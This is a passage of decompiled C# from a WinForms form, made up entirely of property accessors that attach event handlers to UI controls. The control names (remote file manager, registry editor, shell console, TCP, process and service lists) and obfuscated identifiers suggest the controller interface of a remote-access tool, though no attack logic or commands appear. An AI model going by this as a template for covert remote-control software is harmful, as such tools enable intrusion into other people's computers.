			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.NewFolderToolStripMenuItem_Click);
				bool flag = this._NewFolderToolStripMenuItem != null;
				if (flag)
				{
					this._NewFolderToolStripMenuItem.Click -= eventHandler;
				}
				this._NewFolderToolStripMenuItem = value;
				flag = this._NewFolderToolStripMenuItem != null;
				if (flag)
				{
					this._NewFolderToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000143 RID: 323
		// (get) Token: 0x06000360 RID: 864 RVA: 0x001656B8 File Offset: 0x00163AB8
		// (set) Token: 0x06000361 RID: 865 RVA: 0x001656D0 File Offset: 0x00163AD0
		internal virtual ToolStripMenuItem OpenDownloadsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenDownloadsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.OpenDownloadsToolStripMenuItem_Click);
				bool flag = this._OpenDownloadsToolStripMenuItem != null;
				if (flag)
				{
					this._OpenDownloadsToolStripMenuItem.Click -= eventHandler;
				}
				this._OpenDownloadsToolStripMenuItem = value;
				flag = this._OpenDownloadsToolStripMenuItem != null;
				if (flag)
				{
					this._OpenDownloadsToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000144 RID: 324
		// (get) Token: 0x06000362 RID: 866 RVA: 0x00165730 File Offset: 0x00163B30
		// (set) Token: 0x06000363 RID: 867 RVA: 0x00165748 File Offset: 0x00163B48
		internal virtual ToolStripMenuItem RarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RarToolStripMenuItem_Click);
				bool flag = this._RarToolStripMenuItem != null;
				if (flag)
				{
					this._RarToolStripMenuItem.Click -= eventHandler;
				}
				this._RarToolStripMenuItem = value;
				flag = this._RarToolStripMenuItem != null;
				if (flag)
				{
					this._RarToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000145 RID: 325
		// (get) Token: 0x06000364 RID: 868 RVA: 0x001657A8 File Offset: 0x00163BA8
		// (set) Token: 0x06000365 RID: 869 RVA: 0x001657C0 File Offset: 0x00163BC0
		internal virtual ToolStripMenuItem UnRarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UnRarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.UnRarToolStripMenuItem_Click);
				bool flag = this._UnRarToolStripMenuItem != null;
				if (flag)
				{
					this._UnRarToolStripMenuItem.Click -= eventHandler;
				}
				this._UnRarToolStripMenuItem = value;
				flag = this._UnRarToolStripMenuItem != null;
				if (flag)
				{
					this._UnRarToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000146 RID: 326
		// (get) Token: 0x06000366 RID: 870 RVA: 0x00165820 File Offset: 0x00163C20
		// (set) Token: 0x06000367 RID: 871 RVA: 0x00165838 File Offset: 0x00163C38
		internal virtual ToolStripMenuItem UploadFromLinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadFromLinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.UploadFromLinkToolStripMenuItem_Click);
				bool flag = this._UploadFromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._UploadFromLinkToolStripMenuItem.Click -= eventHandler;
				}
				this._UploadFromLinkToolStripMenuItem = value;
				flag = this._UploadFromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._UploadFromLinkToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000147 RID: 327
		// (get) Token: 0x06000368 RID: 872 RVA: 0x00165898 File Offset: 0x00163C98
		// (set) Token: 0x06000369 RID: 873 RVA: 0x001658B0 File Offset: 0x00163CB0
		internal virtual ContextMenuStrip ContextMenuStrip4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip4 = value;
			}
		}

		// Token: 0x17000148 RID: 328
		// (get) Token: 0x0600036A RID: 874 RVA: 0x001658BC File Offset: 0x00163CBC
		// (set) Token: 0x0600036B RID: 875 RVA: 0x001658D4 File Offset: 0x00163CD4
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem3_Click);
				bool flag = this._RefreshToolStripMenuItem3 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem3.Click -= eventHandler;
				}
				this._RefreshToolStripMenuItem3 = value;
				flag = this._RefreshToolStripMenuItem3 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem3.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000149 RID: 329
		// (get) Token: 0x0600036C RID: 876 RVA: 0x00165934 File Offset: 0x00163D34
		// (set) Token: 0x0600036D RID: 877 RVA: 0x0016594C File Offset: 0x00163D4C
		internal virtual ImageList MG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG = value;
			}
		}

		// Token: 0x1700014A RID: 330
		// (get) Token: 0x0600036E RID: 878 RVA: 0x00165958 File Offset: 0x00163D58
		// (set) Token: 0x0600036F RID: 879 RVA: 0x00165970 File Offset: 0x00163D70
		internal virtual ListView ListView1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ListView1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ListView1_SelectedIndexChanged);
				bool flag = this._ListView1 != null;
				if (flag)
				{
					this._ListView1.SelectedIndexChanged -= eventHandler;
				}
				this._ListView1 = value;
				flag = this._ListView1 != null;
				if (flag)
				{
					this._ListView1.SelectedIndexChanged += eventHandler;
				}
			}
		}

		// Token: 0x1700014B RID: 331
		// (get) Token: 0x06000370 RID: 880 RVA: 0x001659D0 File Offset: 0x00163DD0
		// (set) Token: 0x06000371 RID: 881 RVA: 0x001659E8 File Offset: 0x00163DE8
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x1700014C RID: 332
		// (get) Token: 0x06000372 RID: 882 RVA: 0x001659F4 File Offset: 0x00163DF4
		// (set) Token: 0x06000373 RID: 883 RVA: 0x00165A0C File Offset: 0x00163E0C
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x1700014D RID: 333
		// (get) Token: 0x06000374 RID: 884 RVA: 0x00165A18 File Offset: 0x00163E18
		// (set) Token: 0x06000375 RID: 885 RVA: 0x00165A30 File Offset: 0x00163E30
		internal virtual ImageList vmethod_148
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_148;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._vmethod_148 = value;
			}
		}

		// Token: 0x1700014E RID: 334
		// (get) Token: 0x06000376 RID: 886 RVA: 0x00165A3C File Offset: 0x00163E3C
		// (set) Token: 0x06000377 RID: 887 RVA: 0x00165A54 File Offset: 0x00163E54
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer1 = value;
			}
		}

		// Token: 0x1700014F RID: 335
		// (get) Token: 0x06000378 RID: 888 RVA: 0x00165A60 File Offset: 0x00163E60
		// (set) Token: 0x06000379 RID: 889 RVA: 0x00165A78 File Offset: 0x00163E78
		internal virtual Panel FMM
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FMM;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._FMM = value;
			}
		}

		// Token: 0x17000150 RID: 336
		// (get) Token: 0x0600037A RID: 890 RVA: 0x00165A84 File Offset: 0x00163E84
		// (set) Token: 0x0600037B RID: 891 RVA: 0x00165A9C File Offset: 0x00163E9C
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000151 RID: 337
		// (get) Token: 0x0600037C RID: 892 RVA: 0x00165AA8 File Offset: 0x00163EA8
		// (set) Token: 0x0600037D RID: 893 RVA: 0x00165AC0 File Offset: 0x00163EC0
		internal virtual GClass9 L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.L1_DoubleClick1);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick -= eventHandler;
				}
				this._L1 = value;
				flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick += eventHandler;
				}
			}
		}

		// Token: 0x17000152 RID: 338
		// (get) Token: 0x0600037E RID: 894 RVA: 0x00165B20 File Offset: 0x00163F20
		// (set) Token: 0x0600037F RID: 895 RVA: 0x00165B38 File Offset: 0x00163F38
		internal virtual ColumnHeader ColumnHeader6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader6 = value;
			}
		}

		// Token: 0x17000153 RID: 339
		// (get) Token: 0x06000380 RID: 896 RVA: 0x00165B44 File Offset: 0x00163F44
		// (set) Token: 0x06000381 RID: 897 RVA: 0x00165B5C File Offset: 0x00163F5C
		internal virtual ColumnHeader ColumnHeader7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader7 = value;
			}
		}

		// Token: 0x17000154 RID: 340
		// (get) Token: 0x06000382 RID: 898 RVA: 0x00165B68 File Offset: 0x00163F68
		// (set) Token: 0x06000383 RID: 899 RVA: 0x00165B80 File Offset: 0x00163F80
		internal virtual PictureBox p
		{
			[DebuggerNonUserCode]
			get
			{
				return this._p;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._p = value;
			}
		}

		// Token: 0x17000155 RID: 341
		// (get) Token: 0x06000384 RID: 900 RVA: 0x00165B8C File Offset: 0x00163F8C
		// (set) Token: 0x06000385 RID: 901 RVA: 0x00165BA4 File Offset: 0x00163FA4
		internal virtual GClass9 L2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.L2_SelectedIndexChanged);
				EventHandler eventHandler2 = new EventHandler(this.L2_DoubleClick);
				bool flag = this._L2 != null;
				if (flag)
				{
					this._L2.SelectedIndexChanged -= eventHandler;
					this._L2.DoubleClick -= eventHandler2;
				}
				this._L2 = value;
				flag = this._L2 != null;
				if (flag)
				{
					this._L2.SelectedIndexChanged += eventHandler;
					this._L2.DoubleClick += eventHandler2;
				}
			}
		}

		// Token: 0x17000156 RID: 342
		// (get) Token: 0x06000386 RID: 902 RVA: 0x00165C2C File Offset: 0x0016402C
		// (set) Token: 0x06000387 RID: 903 RVA: 0x00165C44 File Offset: 0x00164044
		internal virtual ColumnHeader ColumnHeader8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader8 = value;
			}
		}

		// Token: 0x17000157 RID: 343
		// (get) Token: 0x06000388 RID: 904 RVA: 0x00165C50 File Offset: 0x00164050
		// (set) Token: 0x06000389 RID: 905 RVA: 0x00165C68 File Offset: 0x00164068
		internal virtual ColumnHeader ColumnHeader9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader9 = value;
			}
		}

		// Token: 0x17000158 RID: 344
		// (get) Token: 0x0600038A RID: 906 RVA: 0x00165C74 File Offset: 0x00164074
		// (set) Token: 0x0600038B RID: 907 RVA: 0x00165C8C File Offset: 0x0016408C
		internal virtual ColumnHeader ColumnHeader10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader10 = value;
			}
		}

		// Token: 0x17000159 RID: 345
		// (get) Token: 0x0600038C RID: 908 RVA: 0x00165C98 File Offset: 0x00164098
		// (set) Token: 0x0600038D RID: 909 RVA: 0x00165CB0 File Offset: 0x001640B0
		internal virtual GClass9 LTCP
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LTCP;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LTCP = value;
			}
		}

		// Token: 0x1700015A RID: 346
		// (get) Token: 0x0600038E RID: 910 RVA: 0x00165CBC File Offset: 0x001640BC
		// (set) Token: 0x0600038F RID: 911 RVA: 0x00165CD4 File Offset: 0x001640D4
		internal virtual ColumnHeader ColumnHeader16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader16 = value;
			}
		}

		// Token: 0x1700015B RID: 347
		// (get) Token: 0x06000390 RID: 912 RVA: 0x00165CE0 File Offset: 0x001640E0
		// (set) Token: 0x06000391 RID: 913 RVA: 0x00165CF8 File Offset: 0x001640F8
		internal virtual ColumnHeader ColumnHeader17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader17 = value;
			}
		}

		// Token: 0x1700015C RID: 348
		// (get) Token: 0x06000392 RID: 914 RVA: 0x00165D04 File Offset: 0x00164104
		// (set) Token: 0x06000393 RID: 915 RVA: 0x00165D1C File Offset: 0x0016411C
		internal virtual ColumnHeader ColumnHeader18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader18 = value;
			}
		}

		// Token: 0x1700015D RID: 349
		// (get) Token: 0x06000394 RID: 916 RVA: 0x00165D28 File Offset: 0x00164128
		// (set) Token: 0x06000395 RID: 917 RVA: 0x00165D40 File Offset: 0x00164140
		internal virtual ColumnHeader ColumnHeader19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader19 = value;
			}
		}

		// Token: 0x1700015E RID: 350
		// (get) Token: 0x06000396 RID: 918 RVA: 0x00165D4C File Offset: 0x0016414C
		// (set) Token: 0x06000397 RID: 919 RVA: 0x00165D64 File Offset: 0x00164164
		internal virtual ColumnHeader ColumnHeader20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader20 = value;
			}
		}

		// Token: 0x1700015F RID: 351
		// (get) Token: 0x06000398 RID: 920 RVA: 0x00165D70 File Offset: 0x00164170
		// (set) Token: 0x06000399 RID: 921 RVA: 0x00165D88 File Offset: 0x00164188
		internal virtual ColumnHeader ColumnHeader21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader21 = value;
			}
		}

		// Token: 0x17000160 RID: 352
		// (get) Token: 0x0600039A RID: 922 RVA: 0x00165D94 File Offset: 0x00164194
		// (set) Token: 0x0600039B RID: 923 RVA: 0x00165DAC File Offset: 0x001641AC
		internal virtual Panel RG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RG = value;
			}
		}

		// Token: 0x17000161 RID: 353
		// (get) Token: 0x0600039C RID: 924 RVA: 0x00165DB8 File Offset: 0x001641B8
		// (set) Token: 0x0600039D RID: 925 RVA: 0x00165DD0 File Offset: 0x001641D0
		internal virtual GClass9 RGLIST
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RGLIST;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RGLIST_DoubleClick);
				bool flag = this._RGLIST != null;
				if (flag)
				{
					this._RGLIST.DoubleClick -= eventHandler;
				}
				this._RGLIST = value;
				flag = this._RGLIST != null;
				if (flag)
				{
					this._RGLIST.DoubleClick += eventHandler;
				}
			}
		}

		// Token: 0x17000162 RID: 354
		// (get) Token: 0x0600039E RID: 926 RVA: 0x00165E30 File Offset: 0x00164230
		// (set) Token: 0x0600039F RID: 927 RVA: 0x00165E48 File Offset: 0x00164248
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x17000163 RID: 355
		// (get) Token: 0x060003A0 RID: 928 RVA: 0x00165E54 File Offset: 0x00164254
		// (set) Token: 0x060003A1 RID: 929 RVA: 0x00165E6C File Offset: 0x0016426C
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x17000164 RID: 356
		// (get) Token: 0x060003A2 RID: 930 RVA: 0x00165E78 File Offset: 0x00164278
		// (set) Token: 0x060003A3 RID: 931 RVA: 0x00165E90 File Offset: 0x00164290
		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		// Token: 0x17000165 RID: 357
		// (get) Token: 0x060003A4 RID: 932 RVA: 0x00165E9C File Offset: 0x0016429C
		// (set) Token: 0x060003A5 RID: 933 RVA: 0x00165EB4 File Offset: 0x001642B4
		internal virtual TreeView RGk
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RGk;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				TreeNodeMouseClickEventHandler treeNodeMouseClickEventHandler = new TreeNodeMouseClickEventHandler(this.RGk_NodeMouseClick);
				TreeViewEventHandler treeViewEventHandler = new TreeViewEventHandler(this.RGk_AfterSelect);
				TreeViewEventHandler treeViewEventHandler2 = new TreeViewEventHandler(this.RGk_AfterExpand);
				TreeViewEventHandler treeViewEventHandler3 = new TreeViewEventHandler(this.RGk_AfterCollapse);
				bool flag = this._RGk != null;
				if (flag)
				{
					this._RGk.NodeMouseDoubleClick -= treeNodeMouseClickEventHandler;
					this._RGk.AfterSelect -= treeViewEventHandler;
					this._RGk.AfterExpand -= treeViewEventHandler2;
					this._RGk.AfterCollapse -= treeViewEventHandler3;
				}
				this._RGk = value;
				flag = this._RGk != null;
				if (flag)
				{
					this._RGk.NodeMouseDoubleClick += treeNodeMouseClickEventHandler;
					this._RGk.AfterSelect += treeViewEventHandler;
					this._RGk.AfterExpand += treeViewEventHandler2;
					this._RGk.AfterCollapse += treeViewEventHandler3;
				}
			}
		}

		// Token: 0x17000166 RID: 358
		// (get) Token: 0x060003A6 RID: 934 RVA: 0x00165F90 File Offset: 0x00164390
		// (set) Token: 0x060003A7 RID: 935 RVA: 0x00165FA8 File Offset: 0x001643A8
		internal virtual Panel sh
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sh;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.sh_Resize);
				bool flag = this._sh != null;
				if (flag)
				{
					this._sh.Resize -= eventHandler;
				}
				this._sh = value;
				flag = this._sh != null;
				if (flag)
				{
					this._sh.Resize += eventHandler;
				}
			}
		}

		// Token: 0x17000167 RID: 359
		// (get) Token: 0x060003A8 RID: 936 RVA: 0x00166008 File Offset: 0x00164408
		// (set) Token: 0x060003A9 RID: 937 RVA: 0x00166020 File Offset: 0x00164420
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x17000168 RID: 360
		// (get) Token: 0x060003AA RID: 938 RVA: 0x0016602C File Offset: 0x0016442C
		// (set) Token: 0x060003AB RID: 939 RVA: 0x00166044 File Offset: 0x00164444
		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler keyEventHandler = new KeyEventHandler(this.T2_KeyDown);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown -= keyEventHandler;
				}
				this._T2 = value;
				flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown += keyEventHandler;
				}
			}
		}

		// Token: 0x17000169 RID: 361
		// (get) Token: 0x060003AC RID: 940 RVA: 0x001660A4 File Offset: 0x001644A4
		// (set) Token: 0x060003AD RID: 941 RVA: 0x001660BC File Offset: 0x001644BC
		internal virtual GClass9 LPR
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LPR;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LPR = value;
			}
		}

		// Token: 0x1700016A RID: 362
		// (get) Token: 0x060003AE RID: 942 RVA: 0x001660C8 File Offset: 0x001644C8
		// (set) Token: 0x060003AF RID: 943 RVA: 0x001660E0 File Offset: 0x001644E0
		internal virtual ColumnHeader ColumnHeader22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader22 = value;
			}
		}

		// Token: 0x1700016B RID: 363
		// (get) Token: 0x060003B0 RID: 944 RVA: 0x001660EC File Offset: 0x001644EC
		// (set) Token: 0x060003B1 RID: 945 RVA: 0x00166104 File Offset: 0x00164504
		internal virtual ColumnHeader ColumnHeader23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader23 = value;
			}
		}

		// Token: 0x1700016C RID: 364
		// (get) Token: 0x060003B2 RID: 946 RVA: 0x00166110 File Offset: 0x00164510
		// (set) Token: 0x060003B3 RID: 947 RVA: 0x00166128 File Offset: 0x00164528
		internal virtual ColumnHeader ColumnHeader24
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader24;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader24 = value;
			}
		}

		// Token: 0x1700016D RID: 365
		// (get) Token: 0x060003B4 RID: 948 RVA: 0x00166134 File Offset: 0x00164534
		// (set) Token: 0x060003B5 RID: 949 RVA: 0x0016614C File Offset: 0x0016454C
		internal virtual ColumnHeader ColumnHeader25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader25 = value;
			}
		}

		// Token: 0x1700016E RID: 366
		// (get) Token: 0x060003B6 RID: 950 RVA: 0x00166158 File Offset: 0x00164558
		// (set) Token: 0x060003B7 RID: 951 RVA: 0x00166170 File Offset: 0x00164570
		internal virtual ColumnHeader ColumnHeader26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader26 = value;
			}
		}

		// Token: 0x1700016F RID: 367
		// (get) Token: 0x060003B8 RID: 952 RVA: 0x0016617C File Offset: 0x0016457C
		// (set) Token: 0x060003B9 RID: 953 RVA: 0x00166194 File Offset: 0x00164594
		internal virtual GClass9 LSRV
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LSRV;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LSRV = value;
			}
		}

		// Token: 0x17000170 RID: 368
		// (get) Token: 0x060003BA RID: 954 RVA: 0x001661A0 File Offset: 0x001645A0
		// (set) Token: 0x060003BB RID: 955 RVA: 0x001661B8 File Offset: 0x001645B8
		internal virtual ColumnHeader ColumnHeader11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader11 = value;
			}
		}

		// Token: 0x17000171 RID: 369
		// (get) Token: 0x060003BC RID: 956 RVA: 0x001661C4 File Offset: 0x001645C4
		// (set) Token: 0x060003BD RID: 957 RVA: 0x001661DC File Offset: 0x001645DC
		internal virtual ColumnHeader ColumnHeader12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader12 = value;
			}
		}

		// Token: 0x17000172 RID: 370
		// (get) Token: 0x060003BE RID: 958 RVA: 0x001661E8 File Offset: 0x001645E8
		// (set) Token: 0x060003BF RID: 959 RVA: 0x00166200 File Offset: 0x00164600
		internal virtual ColumnHeader ColumnHeader13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader13 = value;
			}
		}

		// Token: 0x17000173 RID: 371
		// (get) Token: 0x060003C0 RID: 960 RVA: 0x0016620C File Offset: 0x0016460C
		// (set) Token: 0x060003C1 RID: 961 RVA: 0x00166224 File Offset: 0x00164624
		internal virtual ColumnHeader ColumnHeader14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader14 = value;
			}
		}

		// Token: 0x17000174 RID: 372
		// (get) Token: 0x060003C2 RID: 962 RVA: 0x00166230 File Offset: 0x00164630
		// (set) Token: 0x060003C3 RID: 963 RVA: 0x00166248 File Offset: 0x00164648
		internal virtual ColumnHeader ColumnHeader15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader15 = value;
			}
		}

		// Token: 0x17000175 RID: 373
		// (get) Token: 0x060003C4 RID: 964 RVA: 0x00166254 File Offset: 0x00164654
		// (set) Token: 0x060003C5 RID: 965 RVA: 0x0016626C File Offset: 0x0016466C
		internal virtual ImageList vmethod_108
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_108;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._vmethod_108 = value;
			}
		}

		// Token: 0x17000176 RID: 374
		// (get) Token: 0x060003C6 RID: 966 RVA: 0x00166278 File Offset: 0x00164678
		// (set) Token: 0x060003C7 RID: 967 RVA: 0x00166290 File Offset: 0x00164690
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= eventHandler;
				}
				this._ToolStripMenuItem1 = value;
				flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
